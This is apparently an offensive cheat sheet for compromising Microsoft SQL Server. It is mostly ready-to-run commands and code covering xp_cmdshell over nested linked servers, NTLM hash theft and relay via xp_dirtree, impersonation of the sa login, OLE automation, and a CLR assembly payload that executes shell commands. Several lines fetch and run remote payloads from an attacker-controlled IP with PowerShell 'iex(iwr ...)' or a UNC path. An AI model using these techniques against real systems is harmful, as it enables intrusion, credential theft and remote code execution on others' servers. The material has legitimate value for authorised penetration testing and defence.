# MSSQL

### [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

#### Find Servers

```text
Get-SQLInstanceDomain
```

#### Find Servers the current user can connect to as

```text
PowerShell Get-SQLInstanceDomain | Get-SQLConnectionTest
```

#### Execute query or command

```text
Get-SQLQuery -Instance '<server>.<domain>,1433' -Query 'select @@servername'
Invoke-SQLOSCmd -Instance '<server>.<domain>,1433' -Command 'dir C:\' -RawResults
```

#### Crawl Database Links

```text
Get-SQLServerLinkCrawl -Instance '<server>.<domain>,1433'
```

### Linked Servers

#### Query through linked server

```text
select version from openquery("<server>", 'select @@version as version')
```

#### Command through linked server

```text
EXEC('xp_cmdshell ''\\<ip>\public\payload.exe'';') AT [SERVERNAME]
EXEC('xp_cmdshell ''powershell.exe -exec bypass -c "iex(iwr http://<ip>/run.txt -usebasicparsing)"'';') AT [SERVERNAME]
```

This can also be nested \(potentially coming back to the own server with different permissions\):

```text
EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT SERVER1') AT SERVER2
EXEC ('EXEC (''xp_cmdshell ''''powershell.exe -exec bypass -c "iex(iwr http://<ip>/run.txt -usebasicparsing)"'''';'') AT SERVER1') AT SERVER2
```

#### Read file through linked servers

```text
select * from openquery("<server>.<domain>", 'select * from openquery("<server>.<domain>", ''select * from openrowset(bulk N''''C:\x.txt'''', single_nclob) as contents'')')
```

### Linked Servers via Metasploit

We can use "windows/mssql/mssql\_linkcrawler" to find linked servers and even execute commands on them.

### xp\_cmdshell

#### Enable locally

```text
sp_configure 'Show Advanced Options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE
```

#### Enable through link \(requires RPC Out enabled\)

```text
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [<server>]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [<server>]
SELECT * FROM OPENQUERY("<server>", 'select * from sys.configurations where name = ''xp_cmdshell''')
```

#### Running xp\_cmdshell through serverlink

```text
SELECT * FROM OPENQUERY("<server>", 'select @@servername; exec xp_cmdshell ''dir c:''')
```

This will however not give any output \(but still execute\).

### External python script

```text
EXEC sp_configure 'external scripts enabled', 1
RECONFIGURE
EXEC sp_execute_external_script
@language =N'Python',
@script= N'import os; os.system("whoami")'
go
```

### SQLShell on Linux

```bash
docker pull mcr.microsoft.com/mssql-tools
docker run -it mcr.microsoft.com/mssql-tools
```

### Interact via C\#

#### Connect

```csharp
using System;
using System.Data.SqlClient;

namespace Connect {
  class Program {
    static void Main(string[] args) {
      String sqlServer = "<server>";
      String database = "master";
      String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;";
      SqlConnection con = new SqlConnection(conString);
      
      try {
        con.Open();
        Console.WriteLine("Authentication successful!");
      } catch {
        Console.WriteLine("Authentication failed");
        Environment.Exit(0);
      }
      con.Close();
    }
  }
}
```

Any Domain User can by default access any MSSQL server via Kerberos \(as guest user and databases have separate permissions\).

#### Execute Queries

```csharp
String querylogin = "SELECT SYSTEM_USER;";
SqlCommand command = new SqlCommand(querylogin, con);
SqlDataReader reader = command.ExecuteReader();
reader.Read();
Console.WriteLine("Logged in as: " + reader[0]);
reader.Close();
```

### xp\_dirtree

Running xp\_dirtree on a UNC path will cause NTLM Authentication, the hash can be stolen via responder/metasploit and cracked \(hashcat mode 5600\).

```text
EXEC master..xp_dirtree \\<ip>\share
```

Alternatively the hash can be relayed:

```text
sudo impacket-ntlmrelayx --no-http-server -smb2support -t <target> -c 'powershell -enc ...'
```

### Impersonation

Find accounts which can be impersonated:

```text
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

This allows us to run a query as another user:

```text
EXECUTE AS LOGIN = 'sa';
```

To compromise a complete server, the database user we impersonate must be in a db that has the "Trustworthy" property \(by default only "msdb"\), e.g.:

```text
use msdb; EXECUTE AS USER = 'dbo';
```

### Execute OLE objects

```text
EXECUTE AS LOGIN = 'sa';
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;"
DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell',@myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'whoami';"
```

### Execute Custom Assemblies

Write a managed DLL payload:

```csharp
using System;
using Microsoft.SqlServer.Server;
using System.Data.SqlTypes;
using System.Diagnostics;

namespace StoredProcedures
{
    class Program
    {
        [Microsoft.SqlServer.Server.SqlProcedure]
        public static void cmdExec(SqlString execCommand)
        {
            // execute command
            Process proc = new Process();
            proc.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
            proc.StartInfo.Arguments = string.Format(@" /C {0}", execCommand);
            proc.StartInfo.UseShellExecute = false;
            proc.StartInfo.RedirectStandardOutput = true;
            proc.Start();

            // write result into table and show
            SqlDataRecord record = new SqlDataRecord(new SqlMetaData("output", System.Data.SqlDbType.NVarChar, 4000));
            SqlContext.Pipe.SendResultsStart(record);
            record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());
            SqlContext.Pipe.SendResultsRow(record);
            SqlContext.Pipe.SendResultsEnd();

            proc.WaitForExit();
            proc.Close();
        }
    }
}

```

Compile this DLL and then convert into a hexadecimal representation with PowerShell:

```text
$assemblyFile = "payload.dll"
$stringBuilder = New-Object -Type System.Text.StringBuilder
$fileStream = [IO.File]::OpenRead($assemblyFile)
while (($byte = $fileStream.ReadByte()) -gt -1) {
  $stringBuilder.Append($byte.ToString("X2")) | Out-Null
}
$stringBuilder.ToString() -join ""
```

Execute with:

```text
use msdb;
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'clr enabled',1;
RECONFIGURE;
EXEC sp_configure 'clr strict security', 0;
RECONFIGURE;
CREATE ASSEMBLY custom_asm FROM 0x.... WITH PERMISSION_SET = UNSAFE;
CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [custom_asm].[StoredProcedures].[cmdExec];
EXEC cmdExec 'whoami'
```

